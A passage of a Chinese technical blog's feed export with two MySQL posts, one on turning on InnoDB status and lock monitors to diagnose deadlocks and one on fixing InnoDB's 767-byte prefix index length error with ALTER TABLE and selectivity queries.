&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h2&gt;&lt;p&gt;在mysql处理死锁问题时，由于&lt;code&gt;show engine innodb status&lt;/code&gt;输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。&lt;/p&gt;
&lt;p&gt;于是，需要能查看到更详细的事务锁占用情况。&lt;/p&gt;
&lt;h2 id=&quot;二、INNODB监控机制-InnoDB-Monitors&quot;&gt;&lt;a href=&quot;#二、INNODB监控机制-InnoDB-Monitors&quot; class=&quot;headerlink&quot; title=&quot;二、INNODB监控机制(InnoDB Monitors)&quot;&gt;&lt;/a&gt;二、INNODB监控机制(InnoDB Monitors)&lt;/h2&gt;&lt;p&gt;mysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：&lt;code&gt;show engine innodb status&lt;/code&gt;输出到控制台。&lt;br&gt;此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。&lt;/p&gt;
&lt;p&gt;官方说明(详见参考文档1)如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;When you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;p&gt;该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。&lt;br&gt;建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。&lt;/p&gt;
&lt;h2 id=&quot;三、开启状态监控&quot;&gt;&lt;a href=&quot;#三、开启状态监控&quot; class=&quot;headerlink&quot; title=&quot;三、开启状态监控&quot;&gt;&lt;/a&gt;三、开启状态监控&lt;/h2&gt;&lt;p&gt;INNODB监控机制目前主要提供如下四类监控：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。&lt;/li&gt;
&lt;li&gt;锁监控(InnoDB Lock Monitor)：提供额外的锁信息。&lt;/li&gt;
&lt;li&gt;表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。&lt;/li&gt;
&lt;li&gt;表监控(InnoDB Table Monitor)：显示内部数据字典的内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。&lt;br&gt;基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。&lt;/p&gt;
&lt;h3 id=&quot;1-标准监控-Standard-InnoDB-Monitor&quot;&gt;&lt;a href=&quot;#1-标准监控-Standard-InnoDB-Monitor&quot; class=&quot;headerlink&quot; title=&quot;1. 标准监控(Standard InnoDB Monitor)&quot;&gt;&lt;/a&gt;1. 标准监控(Standard InnoDB Monitor)&lt;/h3&gt;&lt;h4 id=&quot;基于系统表：innodb-monitor&quot;&gt;&lt;a href=&quot;#基于系统表：innodb-monitor&quot; class=&quot;headerlink&quot; title=&quot;基于系统表：innodb_monitor&quot;&gt;&lt;/a&gt;基于系统表：innodb_monitor&lt;/h4&gt;&lt;p&gt;mysql会通过检查是否存在名为&lt;code&gt;innodb_monitor&lt;/code&gt;的数据表，来判断是否开启标准监控，并打印日志。&lt;br&gt;需要开启，则创建表；需要关闭，则删除表。&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; innodb_monitor (a &lt;span class=&quot;type&quot;&gt;INT&lt;/span&gt;) ENGINE&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;INNODB;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;DROP&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; innodb_monitor;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;基于系统参数：innodb-status-output&quot;&gt;&lt;a href=&quot;#基于系统参数：innodb-status-output&quot; class=&quot;headerlink&quot; title=&quot;基于系统参数：innodb_status_output&quot;&gt;&lt;/a&gt;基于系统参数：innodb_status_output&lt;/h4&gt;&lt;p&gt;自mysql 5.6.16版本之后，可以通过设置系统参数(&lt;code&gt;innodb_status_output&lt;/code&gt;)的方式开启或者关闭标准监控。&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;GLOBAL&lt;/span&gt; innodb_status_output&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;ON&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;GLOBAL&lt;/span&gt; innodb_status_output&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;OFF;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="数据存储" scheme="http://yeshaoting.cn/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/"/>
    
    
    <category term="mysql" scheme="http://yeshaoting.cn/tags/mysql/"/>
    
    <category term="innodb" scheme="http://yeshaoting.cn/tags/innodb/"/>
    
  </entry>
  
  <entry>
    <title>mysql前缀索引大小限制</title>
    <link href="http://yeshaoting.cn/article/database/mysql%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6/"/>
    <id>http://yeshaoting.cn/article/database/mysql%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6/</id>
    <published>2016-08-04T03:06:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mysql.png" class="img-logo img-center" /><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：<br>ERROR 1071: Specified key was too long; max key length is 767 bytes</p><h2 id="二、问题描述"><a href="#二、问题描述" class="headerlink" title="二、问题描述"></a>二、问题描述</h2><p>今有一张数据表如下，其结构如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `base_info`</span><br><span class="line">(</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;名称&#x27;</span>,</span><br><span class="line">  `urls` <span class="type">varchar</span>(<span class="number">1000</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;链接&#x27;</span>,</span><br><span class="line">  `partition_month` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;快照月份&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`,`partition_month`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;基础信息表&#x27;</span>;</span><br></pre></td></tr></table></figure><p>由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。<br>具体SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `base_info`</span><br><span class="line">ENGINE <span class="operator">=</span> InnoDB;</span><br></pre></td></tr></table></figure><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><h3 id="1-原因分析"><a href="#1-原因分析" class="headerlink" title="1. 原因分析"></a>1. 原因分析</h3><p>不同的数据表存储引擎限制的索引长度不一。<br>数据表存储引擎MyISAM最大索引长度为 <strong>1000B</strong>，而INNODB默认最大索引长度为<strong>767B</strong>。</p><p>上述问题涉及的primary key中partition_month长度为 <strong>256 * 3B = 768B &gt; 767B</strong>。</p><h3 id="2-问题处理"><a href="#2-问题处理" class="headerlink" title="2. 问题处理"></a>2. 问题处理</h3><p>修改索引字段长度，并指定用于索引建立的前缀长度。<br>目前能想到的问题处理方案有如下两种：</p><h4 id="基于业务场景"><a href="#基于业务场景" class="headerlink" title="基于业务场景"></a>基于业务场景</h4><p>根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。</p><p>从业务角度来看，partition_month值形如：201607。<br>因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `test`.`base_info`</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (`id`, `partition_month`(<span class="number">6</span>));</span><br></pre></td></tr></table></figure><h4 id="基于数据区分度"><a href="#基于数据区分度" class="headerlink" title="基于数据区分度"></a>基于数据区分度</h4><p>根据具体的数据区分度来设置前缀索引长度。</p><p>假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。<br>如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> urls)<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> urls_full, <span class="built_in">count</span>(<span class="keyword">distinct</span> <span class="keyword">left</span>(urls,<span class="number">100</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> urls_100, <span class="built_in">count</span>(<span class="keyword">distinct</span> <span class="keyword">left</span>(urls,<span class="number">125</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> urls_125, <span class="built_in">count</span>(<span class="keyword">distinct</span> <span class="keyword">left</span>(urls,<span class="number">150</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> urls_150, <span class="built_in">count</span>(<span class="keyword">distinct</span> <span class="keyword">left</span>(urls,<span class="number">200</span>))<span class="operator">/</span><span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> urls_200 <span class="keyword">from</span> base_info;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> urls_full <span class="operator">|</span> urls_100 <span class="operator">|</span> urls_125 <span class="operator">|</span> urls_150 <span class="operator">|</span> urls_200 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">0.9859</span> <span class="operator">|</span>   <span class="number">0.9858</span> <span class="operator">|</span>   <span class="number">0.9858</span> <span class="operator">|</span>   <span class="number">0.9859</span> <span class="operator">|</span>   <span class="number">0.9859</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+----------+----------+</span></span><br></pre></td></tr></table></figure><p>从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。</p><span id="more"></span><h2 id="四、知识点"><a href="#四、知识点" class="headerlink" title="四、知识点"></a>四、知识点</h2><h3 id="1-前缀索引介绍"><a href="#1-前缀索引介绍" class="headerlink" title="1. 前缀索引介绍"></a>1. 前缀索引介绍</h3><p>对于string类型的字段而言，可以使用字段值的主要部分用作索引。其语法为：<code>col_name(length)</code>，用以指定索引前缀长度。<br>CHAR, VARCHAR, BINARY, and VARBINARY 类型字段可以使用前缀索引。<br>BLOB and TEXT 类型字段必须使用前缀索引。</p><p>前缀索引长度单位为字节(bytes)。然而，CREATE TABLE、ALTER TABLE、CREATE INDEX 语句涉及的字段长度单位有如下两种情况：对于非二进制类型(CHAR, VARCHAR, TEXT)字段而言，这个长度指的是字符数；而对于二进制(BINARY, VARBINARY, BLOB)字段而言，这个长度指的是字节数。</p><p>官方说明(详见参考文档2):</p><blockquote><p>For string columns, indexes can be created that use only the leading part of column values, using col_name(length) syntax to specify an index prefix length:<br>Prefixes can be specified for CHAR, VARCHAR, BINARY, and VARBINARY column indexes.<br>Prefixes must be specified for BLOB and TEXT column indexes.<br>Prefix limits are measured in bytes, whereas the prefix length in CREATE TABLE, ALTER TABLE, and CREATE INDEX statements is interpreted as number of characters for nonbinary string types (CHAR, VARCHAR, TEXT) and number of bytes for binary string types (BINARY, VARBINARY, BLOB). Take this into account when specifying a prefix length for a nonbinary string column that uses a multibyte character set.<br>For spatial columns, prefix values cannot be given, as described later in this section.</p></blockquote><h3 id="2-字符占用大小计算"><a href="#2-字符占用大小计算" class="headerlink" title="2. 字符占用大小计算"></a>2. 字符占用大小计算</h3><p>字符长度转换成字节数时，需要考虑表字段的字符编码方式。<br>简单来说，就是字符编码方式不同，1个字符占用的字节数不同。</p><p>常用的字符编码方式与对应的占用大小关系如下：</p><table><thead><tr><th>字符编码</th><th>字符占用大小</th></tr></thead><tbody><tr><td>latin</td><td>单字节：1B</td></tr><tr><td>GBK</td><td>双字节：2B</td></tr><tr><td>UTF8</td><td>三字节：3B</td></tr><tr><td>UTF8mb4</td><td>四字节：4B</td></tr></tbody></table><h3 id="3-前缀索引限制"><a href="#3-前缀索引限制" class="headerlink" title="3. 前缀索引限制"></a>3. 前缀索引限制</h3><p>是否支持前缀索引以及前缀索引长度大小，依赖于数据表使用的存储引擎。<br>对于INNODB存储引擎而言，默认前缀长度最大能支持767字节；而在开启<code>innodb_large_prefix</code>属性值的情况下，最大能支持3072字节。<br>对于MyISAM存储引擎而言，前缀长度限制为1000字节。<br>对于NDB存储引擎而言，并不支持前缀索引。</p><p>官方说明(详见参考文档2):</p><blockquote><p>Prefix support and lengths of prefixes (where supported) are storage engine dependent. For example, a prefix can be up to 767 bytes long for InnoDB tables or 3072 bytes if the innodb_large_prefix option is enabled. For MyISAM tables, the prefix limit is 1000 bytes. The NDB storage engine does not support prefixes (see Section 18.1.6.6, “Unsupported or Missing Features in MySQL Cluster”).</p></blockquote><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ol><li><a href="http://stackoverflow.com/a/1814594">1071 - Specified key was too long; max key length is 767 bytes</a></li><li><a href="http://dev.mysql.com/doc/refman/5.6/en/create-index.html">CREATE INDEX Syntax</a></li><li><a href="http://hidba.org/?p=216">认识mysql前缀索引</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/mysql.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h2&gt;&lt;p&gt;更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：&lt;br&gt;ERROR 1071: Specified key was too long; max key length is 767 bytes&lt;/p&gt;
&lt;h2 id=&quot;二、问题描述&quot;&gt;&lt;a href=&quot;#二、问题描述&quot; class=&quot;headerlink&quot; title=&quot;二、问题描述&quot;&gt;&lt;/a&gt;二、问题描述&lt;/h2&gt;&lt;p&gt;今有一张数据表如下，其结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; IF &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;EXISTS&lt;/span&gt; `base_info`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `id` &lt;span class=&quot;type&quot;&gt;bigint&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; COMMENT &lt;span class=&quot;string&quot;&gt;&amp;#x27;ID&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `name` &lt;span class=&quot;type&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; COMMENT &lt;span class=&quot;string&quot;&gt;&amp;#x27;名称&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `urls` &lt;span class=&quot;type&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; COMMENT &lt;span class=&quot;string&quot;&gt;&amp;#x27;链接&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `partition_month` &lt;span class=&quot;type&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; COMMENT &lt;span class=&quot;string&quot;&gt;&amp;#x27;快照月份&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;PRIMARY&lt;/span&gt; KEY (`id`,`partition_month`)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;) ENGINE&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;MyISAM &lt;span class=&quot;keyword&quot;&gt;DEFAULT&lt;/span&gt; CHARSET&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;utf8 COMMENT&lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;基础信息表&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。&lt;br&gt;具体SQL语句如下：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; `base_info`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ENGINE &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; InnoDB;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;三、解决方案&quot;&gt;&lt;a href=&quot;#三、解决方案&quot; class=&quot;headerlink&quot; title=&quot;三、解决方案&quot;&gt;&lt;/a&gt;三、解决方案&lt;/h2&gt;&lt;h3 id=&quot;1-原因分析&quot;&gt;&lt;a href=&quot;#1-原因分析&quot; class=&quot;headerlink&quot; title=&quot;1. 原因分析&quot;&gt;&lt;/a&gt;1. 原因分析&lt;/h3&gt;&lt;p&gt;不同的数据表存储引擎限制的索引长度不一。&lt;br&gt;数据表存储引擎MyISAM最大索引长度为 &lt;strong&gt;1000B&lt;/strong&gt;，而INNODB默认最大索引长度为&lt;strong&gt;767B&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;上述问题涉及的primary key中partition_month长度为 &lt;strong&gt;256 * 3B = 768B &amp;gt; 767B&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;2-问题处理&quot;&gt;&lt;a href=&quot;#2-问题处理&quot; class=&quot;headerlink&quot; title=&quot;2. 问题处理&quot;&gt;&lt;/a&gt;2. 问题处理&lt;/h3&gt;&lt;p&gt;修改索引字段长度，并指定用于索引建立的前缀长度。&lt;br&gt;目前能想到的问题处理方案有如下两种：&lt;/p&gt;
&lt;h4 id=&quot;基于业务场景&quot;&gt;&lt;a href=&quot;#基于业务场景&quot; class=&quot;headerlink&quot; title=&quot;基于业务场景&quot;&gt;&lt;/a&gt;基于业务场景&lt;/h4&gt;&lt;p&gt;根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。&lt;/p&gt;
&lt;p&gt;从业务角度来看，partition_month值形如：201607。&lt;br&gt;因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 即可。&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ALTER&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; `test`.`base_info`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;DROP&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;PRIMARY&lt;/span&gt; KEY,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ADD&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;PRIMARY&lt;/span&gt; KEY (`id`, `partition_month`(&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;基于数据区分度&quot;&gt;&lt;a href=&quot;#基于数据区分度&quot; class=&quot;headerlink&quot; title=&quot;基于数据区分度&quot;&gt;&lt;/a&gt;基于数据区分度&lt;/h4&gt;&lt;p&gt;根据具体的数据区分度来设置前缀索引长度。&lt;/p&gt;
&lt;p&gt;假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。&lt;br&gt;如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;distinct&lt;/span&gt; urls)&lt;span class=&quot;operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;operator&quot;&gt;*&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; urls_full, &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;distinct&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;left&lt;/span&gt;(urls,&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;))&lt;span class=&quot;operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;operator&quot;&gt;*&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; urls_100, &lt;span class=&quot;built_in&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;distinct&lt;/span&gt; 